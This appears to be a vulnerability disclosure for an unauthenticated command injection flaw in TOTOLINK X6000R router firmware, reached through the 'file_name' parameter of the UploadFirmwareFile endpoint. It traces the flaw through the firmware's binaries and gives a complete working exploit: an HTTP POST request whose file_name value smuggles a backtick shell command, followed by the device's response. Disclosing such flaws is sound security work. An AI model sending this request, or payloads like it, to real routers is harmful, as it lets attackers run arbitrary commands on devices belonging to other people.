# UploadFirmwareFile

**Overview**

- Vendor: TOTOLINK
- Product: Totolink X6000R
- Version: V9.4.0cu.1360_B20241207
- Manufacturer's address：[https://www.totolink.net/](https://www.totolink.net/)
- Firmware download address : [https://www.totolink.net/data/upload/20250328/7a1a804767bc5b1196c480f62c40a20e.rar](https://www.totolink.net/data/upload/20250328/7a1a804767bc5b1196c480f62c40a20e.rar)

**Vulnerability details**

Totolink X6000R V9.4.0cu.1360_B20241207 was found to contain a command injection vulnerability in the `sub_417D74` function via the `file_name` parameter. This vulnerability allows unauthenticated attackers to execute arbitrary commands via a crafted request.

**Analyse**

- In the binary file `shttp`, the function `sub_417D74` retrieves the `file_name` parameter, passes it to the function `firmware_check`

![image.png](UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image.png)

- In the binary file `libcscommon.so` ,the `firmware_check` function passes the value `a1` to the `do_system` function to execute a command.

![image.png](UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image%201.png)

**Request**

```python
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.210.133:8080
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 106

{"file_name": "1`ls>/web/cmd3.txt`","content_length":"100","topicurl":"UploadFirmwareFile","token":"1234"}
```

**Response**

```python
HTTP/1.0 200 OK
Server: SHTTPD 
Date: Tue, 10 Jun 2025 08:06:42 GMT
X-UA-Compatible: IE=edge
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: -1
Content-Type: application/json
Connection: close

{
	"upgradeERR":	"MM_cloud_fw2flash1"
}
```

**PoC**

![image.png](UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image%202.png)

![image.png](UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image%203.png)